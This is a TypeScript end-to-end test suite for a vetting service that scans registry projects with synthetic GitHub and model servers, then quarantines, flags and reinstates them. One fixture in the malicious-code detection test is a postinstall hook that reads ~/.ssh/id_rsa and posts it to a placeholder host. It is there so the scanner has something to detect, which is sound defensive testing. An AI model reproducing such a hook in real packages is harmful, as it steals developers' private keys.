// The bounded-scan service end to end (PRD section 8, release proof in
// section 11; issue #909). One service cycle runs the real signed refresh,
// queue, exact Git acquisition, inspection, Surplus Messages transport,
// evidence retention in local workerd R2 and journaled publication against
// the real handlers and migrations. GitHub, the skill template and Surplus
// are local synthetic servers with harmless fixtures. No real provider,
// key, project or network is contacted.
import { afterEach, beforeEach, expect, test } from "bun:test";
import { spawnSync } from "node:child_process";
import { readdirSync } from "node:fs";
import { mkdir, mkdtemp, readdir, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { CloudflareProjectPersistence } from "../backend/projects/cloudflare-persistence";
import { handleProjectApi } from "../backend/projects/handler";
import { flaggerAuthority } from "../backend/projects/setup";
import { githubFlaggerStanding } from "../backend/vetting/flagger-standing";
import {
  handleProjectFlagsApi,
  ProjectFlagStore,
} from "../backend/vetting/flags";
import {
  handleVettingApi,
  queueAutomaticScan,
  signedVettingRequest,
} from "../backend/vetting/handler";
import { CloudflareVettingPersistence } from "../backend/vetting/persistence";
import { isScanResult } from "../backend/vetting/scan-result";
import { applicationManifest } from "../tests/project-application-manifest";
import { sqliteD1 } from "../tests/sqlite-d1";
import { localVettingEvidence } from "../tests/vetting-evidence-fixture";
import {
  importServiceSigner,
  runScanCycle,
  SCAN_PRIMARY_MODEL,
  SCAN_SPECIALIST_MODEL,
  type ScanServiceDependencies,
  surplusScanProfiles,
} from "../workers/vetting/scan-service";
import { SCAN_REVIEW_AREAS } from "../workers/vetting/scanners";

const ORIGIN = "https://slop.cash";
const NOW = new Date("2026-10-18T12:00:00.000Z");
const ADMIN = { githubId: "900000001", githubLogin: "e2e-admin" };
const APPLICANT = { githubId: "900000002", githubLogin: "e2e-applicant" };
const MODERATOR = { githubId: "900000004", githubLogin: "e2e-moderator" };
const ALICE = { githubId: "900000010", githubLogin: "alice" };
const BOB = { githubId: "900000011", githubLogin: "bob" };
const ACTORS: Record<string, { githubId: string; githubLogin: string }> = {
  admin: ADMIN,
  applicant: APPLICANT,
  alice: ALICE,
  bob: BOB,
};
const SURPLUS_KEY = "local-synthetic-surplus-key";
const sha256 = (value: string | Uint8Array) =>
  new Bun.CryptoHasher("sha256").update(value).digest("hex");

// The skill template the queue binds (served as the site and GitHub would).
const templateText = "Follow the project rules and run its tests.\n";
const rendererText = "export const render = (value) => value;\n";
const templateInputs = {
  contributor: {
    sourcePath: "skills/contributor",
    files: [{ path: "SKILL.md", sha256: sha256(templateText) }],
  },
  reviewer: {
    sourcePath: "skills/reviewer",
    files: [{ path: "SKILL.md", sha256: sha256(templateText) }],
  },
  rendererSources: [{ path: "src/render.mjs", sha256: sha256(rendererText) }],
  acceptedRevisions: ["1"],
};
const TEMPLATE = sha256(JSON.stringify(templateInputs));
const TEMPLATE_COMMIT = "c".repeat(40);

let root: string;
let repository: string;
let clock: Date;
let ids = 0;
let head: string;
let sqlite: ReturnType<typeof sqliteD1>["sqlite"];
let projects: CloudflareProjectPersistence;
let vetting: CloudflareVettingPersistence;
let flags: ProjectFlagStore;
let retained: Awaited<ReturnType<typeof localVettingEvidence>>;
let service: ScanServiceDependencies;
let servicePublicKey: string;
/** What each scan model answers; a test replaces it for risky content. */
let verdicts: Record<
  string,
  "no-findings" | "findings" | "malicious-suspected"
>;
const modelCalls: { model: string; authorization: string | null }[] = [];

function git(...args: string[]) {
  const output = spawnSync("git", ["-c", "core.hooksPath=/dev/null", ...args], {
    cwd: repository,
  });
  if (output.status !== 0) throw new Error(output.stderr.toString());
  return output.stdout.toString().trim();
}

async function commit(files: Record<string, string>, message: string) {
  for (const [path, text] of Object.entries(files)) {
    await mkdir(join(repository, path, ".."), { recursive: true });
    await writeFile(join(repository, path), text);
  }
  git("add", ".");
  git(
    "-c",
    "user.name=Fixture",
    "-c",
    "user.email=fixture@example.invalid",
    "commit",
    "--no-gpg-sign",
    "-qm",
    message,
  );
  head = git("rev-parse", "HEAD");
}

/** The GitHub REST reads acquisition and flag eligibility make. */
function github(url: URL): Response {
  const path = url.pathname;
  if (path === "/repos/example/open-registry")
    return Response.json({
      id: 123456789,
      node_id: "R_example",
      full_name: "example/open-registry",
      private: false,
    });
  const object =
    /^\/repos\/example\/open-registry\/git\/(commits|trees|blobs)\/([0-9a-f]{40})$/u.exec(
      path,
    );
  if (object?.[1] === "commits")
    return Response.json({
      sha: object[2],
      tree: { sha: git("rev-parse", `${object[2]}^{tree}`) },
    });
  if (object?.[1] === "trees")
    return Response.json({
      sha: object[2],
      truncated: false,
      tree: git("ls-tree", "-r", "-t", object[2])
        .split("\n")
        .filter(Boolean)
        .map((line) => {
          const [meta, entryPath] = line.split("\t");
          const [mode, type, sha] = meta.split(" ");
          return { path: entryPath, mode, type, sha };
        }),
    });
  if (object?.[1] === "blobs") {
    const bytes = spawnSync("git", ["cat-file", "blob", object[2]], {
      cwd: repository,
    }).stdout;
    return Response.json({
      sha: object[2],
      encoding: "base64",
      size: bytes.length,
      content: bytes.toString("base64"),
    });
  }
  const user = /^\/user\/([0-9]+)$/u.exec(path)?.[1];
  const actor = Object.values(ACTORS).find((entry) => entry.githubId === user);
  if (actor)
    return Response.json({
      id: Number(actor.githubId),
      login: actor.githubLogin,
      node_id: `U_${actor.githubId}`,
      type: "User",
      created_at: "2020-01-01T00:00:00Z",
    });
  if (/^\/repos\/[^/]+\/[^/]+\/issues$/u.test(path)) {
    const creator = Object.values(ACTORS).find(
      (entry) => entry.githubLogin === url.searchParams.get("creator"),
    );
    return Response.json(
      Array.from({ length: creator ? 2 : 0 }, (_, index) => ({
        number: index + 1,
        user: { id: Number(creator?.githubId) },
        pull_request: { merged_at: "2026-09-01T00:00:00Z" },
      })),
    );
  }
  return new Response(null, { status: 404 });
}

/** Surplus's Anthropic Messages wire, answering by the requested model. */
async function surplus(request: Request): Promise<Response> {
  const body = (await request.json()) as {
    model: string;
    messages: { content: string }[];
  };
  modelCalls.push({
    model: body.model,
    authorization: request.headers.get("authorization"),
  });
  const items = JSON.parse(body.messages[0].content).items as { id: string }[];
  const verdict = verdicts[body.model];
  const risky = items.find((item) => item.id === "scripts/postinstall.js");
  const review = {
    verdict,
    confidence: 0.9,
    coverage: Object.fromEntries(
      SCAN_REVIEW_AREAS.map((area) => [area, "complete"]),
    ),
    findings:
      verdict === "no-findings"
        ? []
        : [
            {
              severity: verdict === "malicious-suspected" ? "critical" : "high",
              summary: "The install hook reads an SSH key and posts it out.",
              evidenceIds: [risky?.id ?? items[0].id],
            },
          ],
  };
  return Response.json({
    id: `msg_${modelCalls.length}`,
    model: body.model,
    stop_reason: "end_turn",
    content: [{ type: "text", text: JSON.stringify(review) }],
    usage: { input_tokens: 40, output_tokens: 20 },
  });
}

const actorOf = (request: Request) =>
  ACTORS[request.headers.get("x-test-actor") ?? ""] ?? null;
const randomId = () =>
  `00000000-0000-4000-8000-${String(++ids).padStart(12, "0")}`;
const livePin = async () => ({ commitSha: head, templateSha256: TEMPLATE });
const vettingDeps = () => ({
  evidence: retained.evidence,
  vetting,
  flags,
  projects,
  resultPublicKeys: servicePublicKey,
  operatorGithubIds: [ADMIN.githubId, MODERATOR.githubId],
  livePin,
  session: async (value: Request) => {
    const actor = actorOf(value);
    return actor && { ...actor, admin: actor === ADMIN };
  },
  now: () => clock,
  randomId,
});

function projectApi(request: Request) {
  return handleProjectApi(request, {
    persistence: projects,
    adminGithubIds: new Set([ADMIN.githubId]),
    moderatorGithubIds: new Set([MODERATOR.githubId]),
    now: () => clock,
    randomId,
    sessionActor: async (value) => actorOf(value),
    repositoryControl: async () => ({ state: "matched", reason: "fixture" }),
    repositoryAccess: async () => ({
      installation: "installed",
      installationId: 1,
      permission: "admin",
      roleName: null,
    }),
    readTokenMetadata: async () => {
      throw new Error("no token reads in this suite");
    },
    github: { fetch: async () => new Response(null, { status: 404 }) },
    vettingClearance: (projectId, manifest, through, forReinstatement) =>
      vetting.manifestClearance(
        projectId,
        manifest,
        through,
        livePin,
        forReinstatement,
      ),
  }) as Promise<Response>;
}

const flagApi = (request: Request) =>
  handleProjectFlagsApi(request, {
    flags,
    projects,
    sessionActor: async (value) => actorOf(value),
    flaggerStanding: githubFlaggerStanding({
      fetch: async (url: string) => github(new URL(url)),
      apiOrigin: "https://api.github.test",
      registryRepositories: async () =>
        (await projects.listProjects()).flatMap((entry) =>
          entry.manifest.repositories.map((item) => item.id),
        ),
    }),
    repositoryAuthority: async (manifest, actor) =>
      flaggerAuthority(
        {
          state: "read",
          access: {
            installation: "installed",
            installationId: 1,
            permission: "read",
            roleName: null,
          },
        },
        actor,
        manifest.repositories[0].id,
      ),
    moderatorGithubIds: [ADMIN.githubId, MODERATOR.githubId],
    queueFreshScan: (project) =>
      queueAutomaticScan(
        vettingDeps(),
        project,
        "Automatic fresh scan after two contributor flags paused the project",
      ),
    now: () => clock,
    randomId,
  }) as Promise<Response>;

/**
 * The only network the service has: Slop's API and site, GitHub's REST
 * API, the template commit on raw.githubusercontent.com and Surplus.
 */
const network = (async (input: string | URL | Request, init?: RequestInit) => {
  const request = new Request(input, init);
  const url = new URL(request.url);
  if (url.origin === ORIGIN) {
    if (url.pathname === "/skill-templates/index.json")
      return Response.json({
        schemaVersion: "1",
        repository: "SlopDotCash/slopdotcash",
        commit: TEMPLATE_COMMIT,
        templateSha256: TEMPLATE,
        revisionStatus: "committed",
        contributor: templateInputs.contributor,
        reviewer: templateInputs.reviewer,
        renderer: {
          sources: templateInputs.rendererSources,
          revisionStatus: "committed",
        },
        acceptedRevisions: templateInputs.acceptedRevisions,
      });
    if (url.pathname.startsWith("/skill-templates/"))
      return new Response(templateText);
    return (
      (await retained.evidence.handle(request)) ??
      (await handleVettingApi(request, vettingDeps())) ??
      (await projectApi(request)) ??
      new Response(null, { status: 404 })
    );
  }
  if (url.origin === "https://api.github.com") return github(url);
  if (
    url.href ===
    `https://raw.githubusercontent.com/SlopDotCash/slopdotcash/${TEMPLATE_COMMIT}/src/render.mjs`
  )
    return new Response(rendererText);
  if (url.href === "https://api.surplusintelligence.ai/anthropic/v1/messages")
    return surplus(request);
  throw new Error(`unexpected network request to ${url.origin}`);
}) as typeof fetch;

beforeEach(async () => {
  clock = NOW;
  modelCalls.length = 0;
  verdicts = {
    [SCAN_PRIMARY_MODEL]: "no-findings",
    [SCAN_SPECIALIST_MODEL]: "no-findings",
  };
  root = await mkdtemp(join(tmpdir(), "slop-scan-service-"));
  repository = join(root, "repository");
  await mkdir(repository);
  await mkdir(join(root, "work"));
  await mkdir(join(root, "journal"));
  git("init", "-q");
  await commit(
    {
      "README.md": "# Open registry\nRun `bun test` before a pull request.\n",
      "package.json": JSON.stringify({
        name: "open-registry",
        scripts: { test: "bun test" },
      }),
      "bun.lock": '{"lockfileVersion":1}',
      "src/registry.ts":
        "export const register = (name: string) => name.trim();\n",
      "AGENTS.md": "Keep changes small and run the tests.\n",
    },
    "Harmless registry",
  );
  const database = sqliteD1(
    readdirSync(new URL("../migrations", import.meta.url))
      .filter((name) => name.endsWith(".sql"))
      .sort(),
  );
  sqlite = database.sqlite;
  projects = new CloudflareProjectPersistence(database.db);
  flags = new ProjectFlagStore(database.db);
  vetting = new CloudflareVettingPersistence(
    database.db,
    async (a) => a.result !== null && retained.evidence.retained(a.result),
  );
  retained = await localVettingEvidence(database.db, () => clock);
  const pair = (await crypto.subtle.generateKey({ name: "Ed25519" }, true, [
    "sign",
    "verify",
  ])) as CryptoKeyPair;
  servicePublicKey = Buffer.from(
    await crypto.subtle.exportKey("raw", pair.publicKey),
  ).toString("base64");
  // The evidence store trusts the same configured service key.
  retained.evidence.deps.signed = (request, maximum) =>
    signedVettingRequest(
      request,
      { resultPublicKeys: servicePublicKey, now: () => clock },
      maximum,
    );
  service = {
    origin: ORIGIN,
    // The operator supplies the key as PKCS #8, as the command reads it.
    signer: await importServiceSigner(
      Buffer.from(
        await crypto.subtle.exportKey("pkcs8", pair.privateKey),
      ).toString("base64"),
    ),
    ...surplusScanProfiles({
      apiKey: SURPLUS_KEY,
      maxOutputTokens: 4096,
      rateCards: {
        primary: {
          uncachedInputNanoUsdPerToken: "5000",
          cachedInputNanoUsdPerToken: "500",
          cacheCreationNanoUsdPerToken: "6250",
          outputNanoUsdPerToken: "25000",
        },
        specialist: {
          uncachedInputNanoUsdPerToken: "3000",
          cachedInputNanoUsdPerToken: "300",
          cacheCreationNanoUsdPerToken: "0",
          outputNanoUsdPerToken: "15000",
        },
      },
    }),
    policyVersion: "slop-bounded-scan-1",
    workDirectory: join(root, "work"),
    journalDirectory: join(root, "journal"),
    fetch: network,
    now: () => clock,
  };
});
afterEach(async () => {
  await retained?.dispose();
  await rm(root, { recursive: true, force: true });
});

function sessionRequest(
  method: string,
  path: string,
  actor: string,
  body?: unknown,
) {
  return new Request(`${ORIGIN}/api/v1/${path}`, {
    method,
    headers: {
      "x-test-actor": actor,
      ...(body === undefined
        ? {}
        : { "content-type": "application/json", origin: ORIGIN }),
    },
    body: body === undefined ? undefined : JSON.stringify(body),
  });
}

async function listPausedProject() {
  const created = await projectApi(
    sessionRequest("POST", "projects", "applicant", {
      manifest: applicationManifest("open-registry", "example/open-registry"),
    }),
  );
  expect(created.status).toBe(201);
}

async function activate() {
  const project = await projects.getProject("open-registry");
  return projectApi(
    sessionRequest("PUT", "admin/projects/open-registry/manifest", "admin", {
      manifest: { ...project?.manifest, status: "active" },
      expectedRevision: project?.revision,
      reason: "Activate the scanned revision",
    }),
  );
}

const publicVetting = async () =>
  (
    await (
      await projectApi(new Request(`${ORIGIN}/api/v1/projects/open-registry`))
    ).json()
  ).vetting;

const flag = (actor: string) =>
  flagApi(
    sessionRequest("POST", "project-flags/open-registry", actor, {
      category: "credential-theft",
      evidence:
        "scripts/postinstall.js reads ~/.ssh/id_rsa and posts it to a remote host",
      evidenceUrl:
        "https://github.com/example/open-registry/blob/main/scripts/postinstall.js",
    }),
  );

async function retainedKinds(assessmentId: string) {
  return sqlite
    .query(
      "SELECT kind, label FROM vetting_evidence_objects WHERE assessment_id = ? ORDER BY kind, label",
    )
    .all(assessmentId);
}

test("self-service setup: one service cycle scans a listed project clean, and the owner can activate it", async () => {
  await listPausedProject();
  expect((await activate()).status).toBe(422);

  const [outcome] = await runScanCycle(service);
  expect(outcome).toMatchObject({
    stage: "published",
    disposition: "clean",
    specialistReviewed: false,
    evidence: "retained",
    publication: "accepted",
  });
  // An ordinary clean project needs only the primary Opus 5.5 review.
  expect(modelCalls).toEqual([
    { model: SCAN_PRIMARY_MODEL, authorization: `Bearer ${SURPLUS_KEY}` },
  ]);
  const assessment = await vetting.getAssessment(outcome.assessmentId);
  expect(assessment).toMatchObject({
    state: "clean",
    commitSha: head,
    templateSha256: TEMPLATE,
    requestReason: "Automatic scan of new project content",
  });
  const result = assessment?.result;
  if (!result || !isScanResult(result)) throw new Error("no bounded result");
  expect(result.primaryReview).toMatchObject({
    provider: "surplus",
    model: SCAN_PRIMARY_MODEL,
    verdict: "no-findings",
    risk: "low",
  });
  expect(
    Object.values(result.coverage).map((surface) => surface.state),
  ).toEqual(Array(6).fill("complete"));
  // The skill template is part of the scanned agent instructions.
  expect(result.coverage.agentInstructions.items).toBeGreaterThanOrEqual(4);
  expect(await retainedKinds(outcome.assessmentId)).toEqual([
    { kind: "artifact", label: "dependency lock bun.lock" },
    { kind: "manifest", label: "bounded scan inventory" },
    { kind: "trace", label: "bounded scan report" },
  ]);
  expect((await publicVetting()).state).toBe("cleared");
  expect((await activate()).status).toBe(200);
  expect((await projects.getProject("open-registry"))?.status).toBe("active");
  // The acquisition directory is removed; the journal keeps one receipt.
  expect(await readdir(join(root, "work"))).toEqual([]);
  expect(await readdir(join(root, "journal"))).toEqual([outcome.assessmentId]);

  // Nothing changed, so the next cycle queues and scans nothing.
  expect(await runScanCycle(service)).toEqual([]);
});

test("malicious-code detection: risky new content is flagged, escalated to the specialist and kept quarantined", async () => {
  await listPausedProject();
  await runScanCycle(service);
  expect((await activate()).status).toBe(200);

  // A new integration-branch commit adds an install hook that steals a key.
  await commit(
    {
      "package.json": JSON.stringify({
        name: "open-registry",
        scripts: {
          test: "bun test",
          postinstall: "node scripts/postinstall.js",
        },
      }),
      "scripts/postinstall.js":
        "const key = require('fs').readFileSync(process.env.HOME + '/.ssh/id_rsa');\nfetch('https://collector.invalid', { method: 'POST', body: key });\n",
    },
    "Add install hook",
  );
  expect((await publicVetting()).state).toBe("stale");
  verdicts = {
    [SCAN_PRIMARY_MODEL]: "malicious-suspected",
    [SCAN_SPECIALIST_MODEL]: "findings",
  };
  modelCalls.length = 0;
  clock = new Date(NOW.getTime() + 60_000);
  const [outcome] = await runScanCycle(service);
  expect(outcome).toMatchObject({
    stage: "published",
    disposition: "incomplete",
    specialistReviewed: true,
    evidence: "retained",
    publication: "accepted",
  });
  // GPT-6.1 Sol runs only because the primary review was high risk.
  expect(modelCalls.map((call) => call.model)).toEqual([
    SCAN_PRIMARY_MODEL,
    SCAN_SPECIALIST_MODEL,
  ]);
  const assessment = await vetting.getAssessment(outcome.assessmentId);
  const result = assessment?.result;
  if (!result || !isScanResult(result)) throw new Error("no bounded result");
  expect(assessment?.state).toBe("incomplete");
  expect(result.checks["credential-theft"]).toBe("flagged");
  expect(result.primaryReview.risk).toBe("high");
  expect(result.specialistReview).toMatchObject({
    provider: "surplus",
    model: SCAN_SPECIALIST_MODEL,
    verdict: "findings",
  });
  // A model label alone never bans: a moderator confirms malice.
  expect(result.confirmation).toBeNull();
  expect((await publicVetting()).state).toBe("quarantined");
  expect(await retainedKinds(outcome.assessmentId)).toContainEqual({
    kind: "trace",
    label: "bounded scan report",
  });
});

test("a two-flag pause is reinstated automatically after the service's clean fresh scan", async () => {
  await listPausedProject();
  await runScanCycle(service);
  expect((await activate()).status).toBe(200);

  expect((await flag("alice")).status).toBe(201);
  clock = new Date(NOW.getTime() + 60_000);
  expect(await (await flag("bob")).json()).toMatchObject({
    paused: true,
    pausedByFlags: true,
    freshScan: "queued",
  });
  expect(
    (await projectApi(new Request(`${ORIGIN}/api/v1/projects/open-registry`)))
      .status,
  ).toBe(410);

  clock = new Date(NOW.getTime() + 120_000);
  const outcomes = await runScanCycle(service);
  expect(outcomes).toEqual([
    expect.objectContaining({ stage: "published", disposition: "clean" }),
  ]);
  const record = (await projects.listEnforcements())
    .filter((entry) => entry.projectId === "open-registry")
    .at(-1);
  expect(record).toMatchObject({
    action: "reinstate",
    stateAfter: "clear",
    actorRole: "vetting-service",
    systemIssuer: {
      rule: "clean-fresh-scan-after-flags",
      assessmentId: outcomes[0].assessmentId,
    },
  });
  expect(
    (await projectApi(new Request(`${ORIGIN}/api/v1/projects/open-registry`)))
      .status,
  ).toBe(200);
  expect(await flags.activeFlags(clock)).toEqual([]);
});

test("a publication the journal already reserved is never retried blindly", async () => {
  await listPausedProject();
  const pending = await (async () => {
    // Queue the scan, then reserve its publication as a lost attempt would.
    const refreshed = await runScanCycle({
      ...service,
      journalDirectory: join(root, "journal"),
      fetch: (async (input: string | URL | Request, init?: RequestInit) => {
        const url = new URL(new Request(input, init).url);
        if (url.pathname === "/api/v1/vetting/results")
          throw new Error("synthetic lost connection");
        return network(input, init);
      }) as typeof fetch,
    });
    return refreshed[0];
  })();
  expect(pending).toMatchObject({
    stage: "publication-failed",
    publication: "unknown",
  });
  expect((await vetting.getAssessment(pending.assessmentId))?.state).toBe(
    "pending",
  );
  modelCalls.length = 0;
  expect(await runScanCycle(service)).toEqual([
    expect.objectContaining({
      assessmentId: pending.assessmentId,
      stage: "journaled-earlier",
    }),
  ]);
  // The reserved assessment is not scanned or sent again.
  expect(modelCalls).toEqual([]);
});

test("a clean result is never published without its retained evidence; the next cycle retries", async () => {
  await listPausedProject();
  const evidenceDown = (async (
    input: string | URL | Request,
    init?: RequestInit,
  ) => {
    const url = new URL(new Request(input, init).url);
    if (url.pathname.startsWith("/api/v1/vetting/evidence/"))
      return Response.json({ error: "evidence_unavailable" }, { status: 503 });
    return network(input, init);
  }) as typeof fetch;
  const [failed] = await runScanCycle({ ...service, fetch: evidenceDown });
  expect(failed).toMatchObject({
    stage: "retention-failed",
    disposition: "clean",
    evidence: "failed",
    publication: null,
  });
  expect((await vetting.getAssessment(failed.assessmentId))?.state).toBe(
    "pending",
  );
  // Nothing was reserved, so the next cycle scans and publishes it.
  expect(await readdir(join(root, "journal"))).toEqual([]);
  clock = new Date(NOW.getTime() + 60_000);
  expect(await runScanCycle(service)).toEqual([
    expect.objectContaining({
      assessmentId: failed.assessmentId,
      stage: "published",
      disposition: "clean",
      evidence: "retained",
    }),
  ]);
  expect((await activate()).status).toBe(200);
});
